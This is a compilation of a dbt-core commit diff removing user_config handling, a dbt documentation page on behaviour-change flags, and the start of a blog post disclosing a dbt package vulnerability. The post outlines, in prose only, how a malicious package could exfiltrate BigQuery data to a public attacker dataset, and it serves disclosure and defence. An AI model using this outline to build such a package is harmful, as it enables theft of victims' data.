[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -8,7 +8,7 @@ |
|  |  | from dbt.clients.system import load\_file\_contents |
|  |  | from dbt.clients.yaml\_helper import load\_yaml\_text |
|  |  | from dbt.contracts.connection import Credentials, HasCredentials |
|  |  | from dbt.contracts.project import ProfileConfig, UserConfig |
|  |  | from dbt.contracts.project import ProfileConfig |
|  |  | from dbt.exceptions import ( |
|  |  | CompilationError, |
|  |  | DbtProfileError, |
| Expand All | | @@ -19,7 +19,6 @@ |
|  |  | ) |
|  |  | from dbt.events.types import MissingProfileTarget |
|  |  | from dbt.events.functions import fire\_event |
|  |  | from dbt.utils import coerce\_dict\_str |
|  |  |  |
|  |  | from .renderer import ProfileRenderer |
|  |  |  |
| Expand Down  Expand Up | | @@ -51,27 +50,13 @@ def read\_profile(profiles\_dir: str) -> Dict[str, Any]: |
|  |  | return {} |
|  |  |  |
|  |  |  |
|  |  | def read\_user\_config(directory: str) -> UserConfig: |
|  |  | try: |
|  |  | profile = read\_profile(directory) |
|  |  | if profile: |
|  |  | user\_config = coerce\_dict\_str(profile.get("config", {})) |
|  |  | if user\_config is not None: |
|  |  | UserConfig.validate(user\_config) |
|  |  | return UserConfig.from\_dict(user\_config) |
|  |  | except (DbtRuntimeError, ValidationError): |
|  |  | pass |
|  |  | return UserConfig() |
|  |  |  |
|  |  |  |
|  |  | # The Profile class is included in RuntimeConfig, so any attribute |
|  |  | # additions must also be set where the RuntimeConfig class is created |
|  |  | # `init=False` is a workaround for https://bugs.python.org/issue45081 |
|  |  | @dataclass(init=False) |
|  |  | class Profile(HasCredentials): |
|  |  | profile\_name: str |
|  |  | target\_name: str |
|  |  | user\_config: UserConfig |
|  |  | threads: int |
|  |  | credentials: Credentials |
|  |  | profile\_env\_vars: Dict[str, Any] |
| Expand All | | @@ -80,7 +65,6 @@ def \_\_init\_\_( |
|  |  | self, |
|  |  | profile\_name: str, |
|  |  | target\_name: str, |
|  |  | user\_config: UserConfig, |
|  |  | threads: int, |
|  |  | credentials: Credentials, |
|  |  | ) -> None: |
| Expand All | | @@ -89,7 +73,6 @@ def \_\_init\_\_( |
|  |  | """ |
|  |  | self.profile\_name = profile\_name |
|  |  | self.target\_name = target\_name |
|  |  | self.user\_config = user\_config |
|  |  | self.threads = threads |
|  |  | self.credentials = credentials |
|  |  | self.profile\_env\_vars = {} # never available on init |
| Expand All | | @@ -106,12 +89,10 @@ def to\_profile\_info(self, serialize\_credentials: bool = False) -> Dict[str, Any] |
|  |  | result = { |
|  |  | "profile\_name": self.profile\_name, |
|  |  | "target\_name": self.target\_name, |
|  |  | "user\_config": self.user\_config, |
|  |  | "threads": self.threads, |
|  |  | "credentials": self.credentials, |
|  |  | } |
|  |  | if serialize\_credentials: |
|  |  | result["user\_config"] = self.user\_config.to\_dict(omit\_none=True) |
|  |  | result["credentials"] = self.credentials.to\_dict(omit\_none=True) |
|  |  | return result |
|  |  |  |
| Expand All | | @@ -124,7 +105,6 @@ def to\_target\_dict(self) -> Dict[str, Any]: |
|  |  | "name": self.target\_name, |
|  |  | "target\_name": self.target\_name, |
|  |  | "profile\_name": self.profile\_name, |
|  |  | "config": self.user\_config.to\_dict(omit\_none=True), |
|  |  | } |
|  |  | ) |
|  |  | return target |
| Expand Down  Expand Up | | @@ -246,7 +226,6 @@ def from\_credentials( |
|  |  | threads: int, |
|  |  | profile\_name: str, |
|  |  | target\_name: str, |
|  |  | user\_config: Optional[Dict[str, Any]] = None, |
|  |  | ) -> "Profile": |
|  |  | """Create a profile from an existing set of Credentials and the |
|  |  | remaining information. |
| Expand All | | @@ -255,20 +234,13 @@ def from\_credentials( |
|  |  | :param threads: The number of threads to use for connections. |
|  |  | :param profile\_name: The profile name used for this profile. |
|  |  | :param target\_name: The target name used for this profile. |
|  |  | :param user\_config: The user-level config block from the |
|  |  | raw profiles, if specified. |
|  |  | :raises DbtProfileError: If the profile is invalid. |
|  |  | :returns: The new Profile object. |
|  |  | """ |
|  |  | if user\_config is None: |
|  |  | user\_config = {} |
|  |  | UserConfig.validate(user\_config) |
|  |  | user\_config\_obj: UserConfig = UserConfig.from\_dict(user\_config) |
|  |  |  |
|  |  | profile = cls( |
|  |  | profile\_name=profile\_name, |
|  |  | target\_name=target\_name, |
|  |  | user\_config=user\_config\_obj, |
|  |  | threads=threads, |
|  |  | credentials=credentials, |
|  |  | ) |
| Expand Down  Expand Up | | @@ -316,7 +288,6 @@ def from\_raw\_profile\_info( |
|  |  | raw\_profile: Dict[str, Any], |
|  |  | profile\_name: str, |
|  |  | renderer: ProfileRenderer, |
|  |  | user\_config: Optional[Dict[str, Any]] = None, |
|  |  | target\_override: Optional[str] = None, |
|  |  | threads\_override: Optional[int] = None, |
|  |  | ) -> "Profile": |
| Expand All | | @@ -328,8 +299,6 @@ def from\_raw\_profile\_info( |
|  |  | disk as yaml and its values rendered with jinja. |
|  |  | :param profile\_name: The profile name used. |
|  |  | :param renderer: The config renderer. |
|  |  | :param user\_config: The global config for the user, if it |
|  |  | was present. |
|  |  | :param target\_override: The target to use, if provided on |
|  |  | the command line. |
|  |  | :param threads\_override: The thread count to use, if |
| Expand All | | @@ -338,9 +307,6 @@ def from\_raw\_profile\_info( |
|  |  | target could not be found |
|  |  | :returns: The new Profile object. |
|  |  | """ |
|  |  | # user\_config is not rendered. |
|  |  | if user\_config is None: |
|  |  | user\_config = raw\_profile.get("config") |
|  |  | # TODO: should it be, and the values coerced to bool? |
|  |  | target\_name, profile\_data = cls.render\_profile( |
|  |  | raw\_profile, profile\_name, target\_override, renderer |
| Expand All | | @@ -361,7 +327,6 @@ def from\_raw\_profile\_info( |
|  |  | profile\_name=profile\_name, |
|  |  | target\_name=target\_name, |
|  |  | threads=threads, |
|  |  | user\_config=user\_config, |
|  |  | ) |
|  |  |  |
|  |  | @classmethod |
| Expand Down  Expand Up | | @@ -396,13 +361,11 @@ def from\_raw\_profiles( |
|  |  | if not raw\_profile: |
|  |  | msg = f"Profile {profile\_name} in profiles.yml is empty" |
|  |  | raise DbtProfileError(INVALID\_PROFILE\_MESSAGE.format(error\_string=msg)) |
|  |  | user\_config = raw\_profiles.get("config") |
|  |  |  |
|  |  | return cls.from\_raw\_profile\_info( |
|  |  | raw\_profile=raw\_profile, |
|  |  | profile\_name=profile\_name, |
|  |  | renderer=renderer, |
|  |  | user\_config=user\_config, |
|  |  | target\_override=target\_override, |
|  |  | threads\_override=threads\_override, |
|  |  | ) |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `87ac4de`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdbt-labs%2Fdbt-core%2Fcommit%2F87ac4deb00cc9fe334706e42a365903a1d581624) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from docs.getdbt.com_ade1a1fa_20250110_152644.html ===

[Skip to main content](#__docusaurus_skipToContent_fallback)[Join our biweekly demos and see dbt Cloud in action!](https://www.getdbt.com/resources/webinars/dbt-cloud-demos-with-experts/?utm_medium=i[…]ly-demos_aw&utm_content=biweekly-demos____&utm_term=all_all__)[![dbt Logo](/img/dbt-logo.svg)![dbt Logo](/img/dbt-logo-light.svg)](/)[Docs](/reference/global-configs/behavior-changes)

* [Product docs](/docs/introduction)
* [API docs](/docs/dbt-cloud-apis/overview)
* [Best practices](/best-practices)
* [Release notes](/docs/dbt-versions/dbt-cloud-release-notes)
[Guides](/guides)[Reference](/reference/references-overview)[v](/reference/global-configs/behavior-changes)

* Cloud (Latest)
* 1.9 (Compatible)
* 1.8
* 1.7
[Resources](/reference/global-configs/behavior-changes)

* [Courses](https://learn.getdbt.com)
* [Best practices](/best-practices)
* [Developer blog](/blog)
[Community](/reference/global-configs/behavior-changes)

* [Join the dbt Community](/community/join)
* [Become a contributor](/community/contribute)
* [Community forum](/community/forum)
* [Events](/community/events)
* [Spotlight](/community/spotlight)
[Create a free account](https://www.getdbt.com/signup/)Search[![dbt Logo](/img/dbt-logo.svg)![dbt Logo](/img/dbt-logo-light.svg)](/)

* [About References](/reference/references-overview)
* [Project configs](/reference/dbt_project.yml)
* [Platform-specific configs](/reference/resource-configs/athena-configs)
* [Resource configs and properties](/reference/configs-and-properties)
* [Commands](/reference/dbt-commands)
  + [dbt Command reference](/reference/dbt-commands)
  + [List of commands](/reference/commands/build)
  + [Node selection](/reference/node-selection/syntax)
  + [Flags (global configs)](/reference/global-configs/about-global-configs)
    - [About flags (global configs)](/reference/global-configs/about-global-configs)
    - [Behavior changes](/reference/global-configs/behavior-changes)
    - [Adapter behavior changes](/reference/global-configs/adapter-behavior-changes)
    - [Setting flags](/reference/global-configs/command-line-options)
    - [Available flags](/reference/global-configs/logs)
  + [Events and logs](/reference/events-logging)
  + [Exit codes](/reference/exit-codes)
  + [Project Parsing](/reference/parsing)
  + [Programmatic invocations](/reference/programmatic-invocations)
* [Jinja Reference](/reference/dbt-jinja-functions)
* [dbt Artifacts](/reference/artifacts/dbt-artifacts)
* [Database Permissions](/reference/database-permissions/about-database-permissions)

* Commands
* [Flags (global configs)](/reference/global-configs/about-global-configs)
* Behavior changes
On this page
# Behavior changes

Most flags exist to configure runtime behaviors with multiple valid choices. The right choice may vary based on the environment, user preference, or the specific invocation.

Another category of flags provides existing projects with a migration window for runtime behaviors that are changing in newer releases of dbt. These flags help us achieve a balance between these goals, which can otherwise be in tension, by:

* Providing a better, more sensible, and more consistent default behavior for new users/projects.
* Providing a migration window for existing users/projects — nothing changes overnight without warning.
* Providing maintainability of dbt software. Every fork in behavior requires additional testing & cognitive overhead that slows future development. These flags exist to facilitate migration from "current" to "better," not to stick around forever.

These flags go through three phases of development:

1. **Introduction (disabled by default):** dbt adds logic to support both 'old' and 'new' behaviors. The 'new' behavior is gated behind a flag, disabled by default, preserving the old behavior.
2. **Maturity (enabled by default):** The default value of the flag is switched, from `false` to `true`, enabling the new behavior by default. Users can preserve the 'old' behavior and opt out of the 'new' behavior by setting the flag to `false` in their projects. They may see deprecation warnings when they do so.
3. **Removal (generally enabled):** After marking the flag for deprecation, we remove it along with the 'old' behavior it supported from the dbt codebases. We aim to support most flags indefinitely, but we're not committed to supporting them forever. If we choose to remove a flag, we'll offer significant advance notice.

## What is a behavior change?[​](/reference/global-configs/behavior-changes#what-is-a-behavior-change "Direct link to What is a behavior change?")

The same dbt project code and the same dbt commands return one result before the behavior change, and they return a different result after the behavior change.

Examples of behavior changes:

* dbt begins raising a validation *error* that it didn't previously.
* dbt changes the signature of a built-in macro. Your project has a custom reimplementation of that macro. This could lead to errors, because your custom reimplementation will be passed arguments it cannot accept.
* A dbt adapter renames or removes a method that was previously available on the `{{ adapter }}` object in the dbt-Jinja context.
* dbt makes a breaking change to contracted metadata artifacts by deleting a required field, changing the name or type of an existing field, or removing the default value of an existing field ([README](https://github.com/dbt-labs/dbt-core/blob/37d382c8e768d1e72acd767e0afdcb1f0dc5e9c5/core/dbt/artifacts/README.md#breaking-changes)).
* dbt removes one of the fields from [structured logs](/reference/events-logging#structured-logging).

The following are **not** behavior changes:

* Fixing a bug where the previous behavior was defective, undesirable, or undocumented.
* dbt begins raising a *warning* that it didn't previously.
* dbt updates the language of human-friendly messages in log events.
* dbt makes a non-breaking change to contracted metadata artifacts by adding a new field with a default, or deleting a field with a default ([README](https://github.com/dbt-labs/dbt-core/blob/37d382c8e768d1e72acd767e0afdcb1f0dc5e9c5/core/dbt/artifacts/README.md#non-breaking-changes)).

The vast majority of changes are not behavior changes. Because introducing these changes does not require any action on the part of users, they are included in continuous releases of dbt Cloud and patch releases of dbt Core.

By contrast, behavior change migrations happen slowly, over the course of months, facilitated by behavior change flags. The flags are loosely coupled to the specific dbt runtime version. By setting flags, users have control over opting in (and later opting out) of these changes.

## Behavior change flags[​](/reference/global-configs/behavior-changes#behavior-change-flags "Direct link to Behavior change flags")

These flags *must* be set in the `flags` dictionary in `dbt_project.yml`. They configure behaviors closely tied to project code, which means they should be defined in version control and modified through pull or merge requests, with the same testing and peer review.

The following example displays the current flags and their current default values in the latest dbt Cloud and dbt Core versions. To opt out of a specific behavior change, set the values of the flag to `False` in `dbt_project.yml`. You will continue to see warnings for legacy behaviors you’ve opted out of, until you either:

* Resolve the issue (by switching the flag to `True`)
* Silence the warnings using the `warn_error_options.silence` flag

Here's an example of the available behavior change flags with their default values:

dbt\_project.yml
```
flags:
  require_explicit_package_overrides_for_builtin_materializations: False
  require_model_names_without_spaces: False
  source_freshness_run_project_hooks: False
  restrict_direct_pg_catalog_access: False
  require_yaml_configuration_for_mf_time_spines: False
  require_batched_execution_for_custom_microbatch_strategy: False

```

This table outlines which month of the "Latest" release track in dbt Cloud and which version of dbt Core contains the behavior change's introduction (disabled by default) or maturity (enabled by default).

| Flag | dbt Cloud "Latest": Intro | dbt Cloud "Latest": Maturity | dbt Core: Intro | dbt Core: Maturity |
| --- | --- | --- | --- | --- |
| [require\_explicit\_package\_overrides\_for\_builtin\_materializations](/reference/global-configs/behavior-changes#package-override-for-built-in-materialization) | 2024.04 | 2024.06 | 1.6.14, 1.7.14 | 1.8.0 |
| [require\_resource\_names\_without\_spaces](/reference/global-configs/behavior-changes#no-spaces-in-resource-names) | 2024.05 | TBD\* | 1.8.0 | 1.10.0 |
| [source\_freshness\_run\_project\_hooks](/reference/global-configs/behavior-changes#project-hooks-with-source-freshness) | 2024.03 | TBD\* | 1.8.0 | 1.10.0 |
| [Redshift] [restrict\_direct\_pg\_catalog\_access](/reference/global-configs/redshift-changes#the-restrict_direct_pg_catalog_access-flag) | 2024.09 | TBD\* | dbt-redshift v1.9.0 | 1.9.0 |
| [skip\_nodes\_if\_on\_run\_start\_fails](/reference/global-configs/behavior-changes#failures-in-on-run-start-hooks) | 2024.10 | TBD\* | 1.9.0 | TBD\* |
| [state\_modified\_compare\_more\_unrendered\_values](/reference/global-configs/behavior-changes#source-definitions-for-state) | 2024.10 | TBD\* | 1.9.0 | TBD\* |
| [require\_yaml\_configuration\_for\_mf\_time\_spines](/reference/global-configs/behavior-changes#metricflow-time-spine-yaml) | 2024.10 | TBD\* | 1.9.0 | TBD\* |
| [require\_batched\_execution\_for\_custom\_microbatch\_strategy](/reference/global-configs/behavior-changes#custom-microbatch-strategy) | 2024.11 | TBD\* | 1.9.0 | TBD\* |
| [cumulative\_type\_params](/reference/global-configs/behavior-changes#cumulative-metrics-parameter) | 2024.11 | TBD\* | 1.9.0 | TBD\* |

When the dbt Cloud Maturity is "TBD," it means we have not yet determined the exact date when these flags' default values will change. Affected users will see deprecation warnings in the meantime, and they will receive emails providing advance warning ahead of the maturity date. In the meantime, if you are seeing a deprecation warning, you can either:

* Migrate your project to support the new behavior, and then set the flag to `True` to stop seeing the warnings.
* Set the flag to `False`. You will continue to see warnings, and you will retain the legacy behavior even after the maturity date (when the default value changes).

### Failures in on-run-start hooks[​](/reference/global-configs/behavior-changes#failures-in-on-run-start-hooks "Direct link to Failures in on-run-start hooks")

The flag is `False` by default.

Set the `skip_nodes_if_on_run_start_fails` flag to `True` to skip all selected resources from running if there is a failure on an `on-run-start` hook.

### Source definitions for state:modified[​](/reference/global-configs/behavior-changes#source-definitions-for-state "Direct link to source-definitions-for-state")

info

You need to build the state directory using dbt v1.9 or higher, or [the dbt Cloud "Latest" release track](/docs/dbt-versions/cloud-release-tracks), and you need to set `state_modified_compare_more_unrendered_values` to `true` within your dbt\_project.yml.

If the state directory was built with an older dbt version or if the `state_modified_compare_more_unrendered_values` behavior change flag was either not set or set to `false`, you need to rebuild the state directory to avoid false positives during state comparison with `state:modified`.

The flag is `False` by default.

Set `state_modified_compare_more_unrendered_values` to `True` to reduce false positives during `state:modified` checks (especially when configs differ by target environment like `prod` vs. `dev`).

Setting the flag to `True` changes the `state:modified` comparison from using rendered values to unrendered values instead. It accomplishes this by persisting `unrendered_config` during model parsing and `unrendered_database` and `unrendered_schema` configs during source parsing.

### Package override for built-in materialization[​](/reference/global-configs/behavior-changes#package-override-for-built-in-materialization "Direct link to Package override for built-in materialization")

Setting the `require_explicit_package_overrides_for_builtin_materializations` flag to `True` prevents this automatic override.

We have deprecated the behavior where installed packages could override built-in materializations without your explicit opt-in. When this flag is set to `True`, a materialization defined in a package that matches the name of a built-in materialization will no longer be included in the search and resolution order. Unlike macros, materializations don't use the `search_order` defined in the project `dispatch` config.

The built-in materializations are `'view'`, `'table'`, `'incremental'`, `'materialized_view'` for models as well as `'test'`, `'unit'`, `'snapshot'`, `'seed'`, and `'clone'`.

You can still explicitly override built-in materializations, in favor of a materialization defined in a package, by reimplementing the built-in materialization in your root project and wrapping the package implementation.

macros/materialization\_view.sql
```
{% materialization view, snowflake %}
  {{ return(my_installed_package_name.materialization_view_snowflake()) }}
{% endmaterialization %}

```

In the future, we may extend the project-level [`dispatch` configuration](/reference/project-configs/dispatch-config) to support a list of authorized packages for overriding built-in materialization.

### No spaces in resource names[​](/reference/global-configs/behavior-changes#no-spaces-in-resource-names "Direct link to No spaces in resource names")

The `require_resource_names_without_spaces` flag enforces using resource names without spaces.

The names of dbt resources (models, sources, etc) should contain letters, numbers, and underscores. We highly discourage the use of other characters, especially spaces. To that end, we have deprecated support for spaces in resource names. When the `require_resource_names_without_spaces` flag is set to `True`, dbt will raise an exception (instead of a deprecation warning) if it detects a space in a resource name.

models/model name with spaces.sql
```
-- This model file should be renamed to model_name_with_underscores.sql

```
### Project hooks with source freshness[​](/reference/global-configs/behavior-changes#project-hooks-with-source-freshness "Direct link to Project hooks with source freshness")

Set the `source_freshness_run_project_hooks` flag to `True` to include "project hooks" ([`on-run-start` / `on-run-end`](/reference/project-configs/on-run-start-on-run-end)) in the `dbt source freshness` command execution.

If you have a specific project [`on-run-start` / `on-run-end`](/reference/project-configs/on-run-start-on-run-end) hooks that should not run before/after `source freshness` command, you can add a conditional check to those hooks:

dbt\_project.yml
```
on-run-start:
  - '{{ ... if flags.WHICH != 'freshness' }}'

```
### MetricFlow time spine YAML[​](/reference/global-configs/behavior-changes#metricflow-time-spine-yaml "Direct link to MetricFlow time spine YAML")

The `require_yaml_configuration_for_mf_time_spines` flag is set to `False` by default.

In previous versions (dbt Core 1.8 and earlier), the MetricFlow time spine configuration was stored in a `metricflow_time_spine.sql` file.

When the flag is set to `True`, dbt will continue to support the SQL file configuration. When the flag is set to `False`, dbt will raise a deprecation warning if it detects a MetricFlow time spine configured in a SQL file.

The MetricFlow YAML file should have the `time_spine:` field. Refer to [MetricFlow timespine](/docs/build/metricflow-time-spine) for more details.

### Custom microbatch strategy[​](/reference/global-configs/behavior-changes#custom-microbatch-strategy "Direct link to Custom microbatch strategy")

The `require_batched_execution_for_custom_microbatch_strategy` flag is set to `False` by default and is only relevant if you already have a custom microbatch macro in your project. If you don't have a custom microbatch macro, you don't need to set this flag as dbt will handle microbatching automatically for any model using the [microbatch strategy](/docs/build/incremental-microbatch#how-microbatch-compares-to-other-incremental-strategies).

Set the flag is set to `True` if you have a custom microbatch macro set up in your project. When the flag is set to `True`, dbt will execute the custom microbatch strategy in batches.

If you have a custom microbatch macro and the flag is left as `False`, dbt will issue a deprecation warning.

Previously, users needed to set the `DBT_EXPERIMENTAL_MICROBATCH` environment variable to `True` to prevent unintended interactions with existing custom incremental strategies. But this is no longer necessary, as setting `DBT_EXPERMINENTAL_MICROBATCH` will no longer have an effect on runtime functionality.

### Cumulative metrics[​](/reference/global-configs/behavior-changes#cumulative-metrics "Direct link to Cumulative metrics")

[Cumulative-type metrics](/docs/build/cumulative#parameters) are nested under the `cumulative_type_params` field in [the dbt Cloud "Latest" release track](/docs/dbt-versions/cloud-release-tracks), dbt Core v1.9 and newer. Currently, dbt will warn users if they have cumulative metrics improperly nested. To enforce the new format (resulting in an error instead of a warning), set the `require_nested_cumulative_type_params` to `True`.

Use the following metric configured with the syntax before v1.9 as an example:

```

    type: cumulative
    type_params:
      measure: order_count
      window: 7 days

```

If you run `dbt parse` with that syntax on Core v1.9 or [the dbt Cloud "Latest" release track](/docs/dbt-versions/cloud-release-tracks), you will receive a warning like:

```

15:36:22  [WARNING]: Cumulative fields `type_params.window` and
`type_params.grain_to_date` has been moved and will soon be deprecated. Please
nest those values under `type_params.cumulative_type_params.window` and
`type_params.cumulative_type_params.grain_to_date`. See documentation on
behavior changes:
https://docs.getdbt.com/reference/global-configs/behavior-changes.

```

If you set `require_nested_cumulative_type_params` to `True` and re-run `dbt parse` you will now receive an error like:

```

21:39:18  Cumulative fields `type_params.window` and `type_params.grain_to_date` should be nested under `type_params.cumulative_type_params.window` and `type_params.cumulative_type_params.grain_to_date`. Invalid metrics: orders_last_7_days. See documentation on behavior changes: https://docs.getdbt.com/reference/global-configs/behavior-changes.

```

Once the metric is updated, it will work as expected:

```

    type: cumulative
    type_params:
      measure:
        name: order_count
      cumulative_type_params:
        window: 7 days

```
0[Edit this page](https://github.com/dbt-labs/docs.getdbt.com/edit/current/website/docs/reference/global-configs/behavior-changes.md)Last updated on **Jan 9, 2025**[PreviousAbout flags (global configs)](/reference/global-configs/about-global-configs)[NextAdapter behavior changes](/reference/global-configs/adapter-behavior-changes)

* [What is a behavior change?](/reference/global-configs/behavior-changes#what-is-a-behavior-change)
* [Behavior change flags](/reference/global-configs/behavior-changes#behavior-change-flags)
  + [Failures in on-run-start hooks](/reference/global-configs/behavior-changes#failures-in-on-run-start-hooks)
  + [Source definitions for state](/reference/global-configs/behavior-changes#source-definitions-for-state)
  + [Package override for built-in materialization](/reference/global-configs/behavior-changes#package-override-for-built-in-materialization)
  + [No spaces in resource names](/reference/global-configs/behavior-changes#no-spaces-in-resource-names)
  + [Project hooks with source freshness](/reference/global-configs/behavior-changes#project-hooks-with-source-freshness)
  + [MetricFlow time spine YAML](/reference/global-configs/behavior-changes#metricflow-time-spine-yaml)
  + [Custom microbatch strategy](/reference/global-configs/behavior-changes#custom-microbatch-strategy)
  + [Cumulative metrics](/reference/global-configs/behavior-changes#cumulative-metrics)

[Edit this page](https://github.com/dbt-labs/docs.getdbt.com/edit/current/website/docs/reference/global-configs/behavior-changes.md)

[Terms of Service](https://www.getdbt.com/terms-of-use/)
[Privacy Policy](https://www.getdbt.com/cloud/privacy-policy/)
[Security](https://www.getdbt.com/security/)
Cookie Settings

© 2025 dbt Labs, Inc. All Rights Reserved.


=== Content from www.equalexperts.com_40d3d6ad_20250110_152651.html ===

[![](https://www.equalexperts.com/wp-content/uploads/2024/10/2024-Logo.svg)](https://www.equalexperts.com)

* About us[About us](https://www.equalexperts.com/about-us/)

  Learn more about Equal Experts, who we are and our way of working.

  About us
  + [About us](https://www.equalexperts.com/about-us/)
  + [Consultant network](https://www.equalexperts.com/about-us/consultant-network/)
  + [The experience model](https://www.equalexperts.com/about-us/the-equal-experts-experience-model/)
  + [Equal Experts trust](https://www.equalexperts.com/about-us/equal-experts-trust/)
  + [Our team](https://www.equalexperts.com/about-us/our-team/)
  + [Values](https://www.equalexperts.com/about-us/our-values/)
  + [Partnerships](https://www.equalexperts.com/about-us/our-partnerships/)
* What we do[What we do](https://www.equalexperts.com/our-services/)

  Discover how our services have helped clients transform their organisations.

  What we do
  + [Our services](https://www.equalexperts.com/our-services/)
  + [Design](https://www.equalexperts.com/our-services/design/)
  + [Data](https://www.equalexperts.com/our-services/data/)
  + [AI](https://www.equalexperts.com/our-services/ai/)
  + [Deliver](https://www.equalexperts.com/our-services/deliver/)
  + [Scale](https://www.equalexperts.com/our-services/scale/)
* Our clients[Our clients](https://www.equalexperts.com/who-we-work-with/)

  Explore case studies and stories of how we have helped build and scale organisations around the globe.

  Our clients
  + [Case studies](https://www.equalexperts.com/case-studies/)
  + [Retail and ecommerce](https://www.equalexperts.com/retail-and-ecommerce/)
  + [Media and entertainment](https://www.equalexperts.com/media-and-entertainment/)
  + [Government and public sector](https://www.equalexperts.com/government-and-public-sector/)
  + [Financial services](https://www.equalexperts.com/financial-services/)
  + [Software and technology](https://www.equalexperts.com/software-and-technology/)
  + [Travel and transport](https://www.equalexperts.com/travel-and-transport/)
  + [Manufacturing](https://www.equalexperts.com/manufacturing/)
  + [Not-for-profit and third sector](https://www.equalexperts.com/charities-not-for-profit-and-third-sector/)
* Insights[Insights](https://www.equalexperts.com/insights/)

  Explore our take on industry trends and developments and our webinars, events and playbooks bought to you by our individuals across our network.

  Insights
  + [Blog](https://www.equalexperts.com/blog/)
  + [Network blogs](https://www.equalexperts.com/network-blogs/)
  + [Playbooks](https://www.equalexperts.com/playbooks/)
  + [Data – Use | Avoid | Explore](https://www.equalexperts.com/data-use-explore-avoid/)
  + [Events](https://www.equalexperts.com/events/)
* Join us[Join us](https://www.equalexperts.com/join-us/)

  Hear what it's like to work for us and how you can join our network.

  Join us
  + [Join us](https://www.equalexperts.com/join-us/)
  + [Current opportunities](https://www.equalexperts.com/current-opportunities/)
  + [Interview process](https://www.equalexperts.com/join-us/interview-process/)
  + [Network benefits](https://www.equalexperts.com/join-us/network-benefits/)
  + [Community events calendar](https://www.equalexperts.com/community-events-calendar/)
* Contact us[Contact us](https://www.equalexperts.com/contact-us/)

  Speak with your local team to find out how we can help you drive greater business value through high-quality technology solutions.

  Contact us
  + [Get in touch](https://www.equalexperts.com/contact-us/)
  + [Australia](https://www.equalexperts.com/contact-us/australia/)
  + [Germany](https://www.equalexperts.com/contact-us/germany/)
  + [India](https://www.equalexperts.com/contact-us/india/)
  + [Netherlands](https://www.equalexperts.com/contact-us/netherlands/)
  + [North America](https://www.equalexperts.com/contact-us/north-america/)
  + [Portugal](https://www.equalexperts.com/contact-us/portugal/)
  + [South Africa](https://www.equalexperts.com/contact-us/south-africa/)
  + [UK](https://www.equalexperts.com/contact-us/uk/)

Menu

Search

Search for:

Search Site

![](https://www.equalexperts.com/wp-content/uploads/2024/07/dbt-issue-THUMB.jpg)

![Paul Brabban](https://www.equalexperts.com/wp-content/uploads/2020/07/Paul-Brabban.jpg)

Paul Brabban

Data Engineer

Tech Focus

July 2, 2024

# Are you at risk from this critical dbt vulnerability?

**A newly discovered critical security vulnerability in the dbt ecosystem**

UPDATE 17th July 2024: [CVE-2024-40637](https://nvd.nist.gov/vuln/detail/CVE-2024-40637) assigned and noted in [GitHub](https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-p3f3-5ccg-83xq).

CVSS score 4.2.

Today we’re sharing news of a critical security vulnerability that affects users of the dbt package ecosystem. This vulnerability, which I discovered with [Michal Czerwinski](https://www.linkedin.com/in/michalczerwinski/), highlights the challenges our industry faces around the security of new software package supply chains. We responsibly disclosed our concerns to [dbt Labs](https://www.getdbt.com/), who accepted the vulnerability and have implemented mitigations.

## Understanding the vulnerability

The dbt tool is widely used to transform data within data warehouses. It allows data analysts and engineers to write modular SQL queries, which can be used in data pipelines.

dbt’s power and flexibility has made it a popular choice in the analytics engineering space, but that same flexibility also introduces significant risks. Because dbt brings its own ecosystem of software packages, the core of this vulnerability is the trust model inherent in software supply chains.

The potential impact of this vulnerability is severe. An attacker could:

1. **Manipulate data:** alter or delete data, leading to data integrity issues
2. **Exfiltrate data:** extract sensitive information from or change permissions in the database

> *“During a threat assessment for one of our clients, we encountered several security concerns. As I explored how to securely expose the DBT ecosystem to our developers, it became clear that there are significant challenges in addressing software supply chain security within the current DBT module ecosystem.” – Michal Czerwinski*

When users install dbt packages from sources other than dbt Labs, they trust that these packages perform the advertised function and nothing more. In affected versions, the new vulnerability abuses the way dbt generates SQL, allowing a malicious dbt package to execute SQL injection attacks without any user interaction. An attacker could craft a dbt package that, once installed, could change, exfiltrate, or delete data within the victim database. We believe this vulnerability affects both dbt-core and the dbt Cloud hosted service.

We should note that dbt packages are not Python packages. They are a part of a dbt-specific package ecosystem that is largely unknown to the infosec community. Software Composition Analysis (SCA) tools like [safetycli](https://safetycli.com/product/safety-cli) and [Snyk](https://snyk.io/) can, along with Static Application Security Testing (SAST), scan third party and transient dependencies, alerting users to known vulnerabilities they might be exposed to.

**This is a critical blind spot for users who depend on such tooling to inform them of vulnerabilities they are exposed to.**

## Simple example: exfiltrating at scale on Google Cloud via dbt

Here’s a simple exploit we crafted to demonstrate the problem. An attacker creates a malicious dbt package that copies your data out of Google BigQuery in the background whilst performing its advertised function.

![](data:image/svg+xml...)![](https://www.equalexperts.com/wp-content/uploads/2024/07/AD_4nXcCQu296yDYOsDS7S9lQI567Nf68FqOIQW7g5VymImby-NNZCJQqZasQme4hMF_Xfmy0L1wrEJN6rV7qM0w4LoTSEWh1M8ZeT_J7g6Sm_FAv0jxaGszhmwogO81JbDWHvkoO3TFb3dwPeZrXZrZZ1izlLP9.png)

The attacker creates a project named “myco\_example\_project” in Google Cloud, and creates a dataset “example\_dataset” inside. This dataset is shared with public Data Editor permissions, so a table can be created in this dataset, and data copied into it from anywhere.

The attacker also creates or compromises a dbt package and publishes that in a public GitHub repository and [dbt Hub](https://hub.getdbt.com/), whilst also deploying marketing to tempt or trick unsuspecting victims into installing it. As with most such ecosystems, [the dbt Hub documentation explicitly states that they do not “certify or confirm the … security of any Packages”](https://docs.getdbt.com/docs/build/packages#hub-packages-recommended), as [reiterated in the disclaimer](https://hub.getdbt.com/disclaimer/). It is for the consumer to accept the risk of installing a specific package.

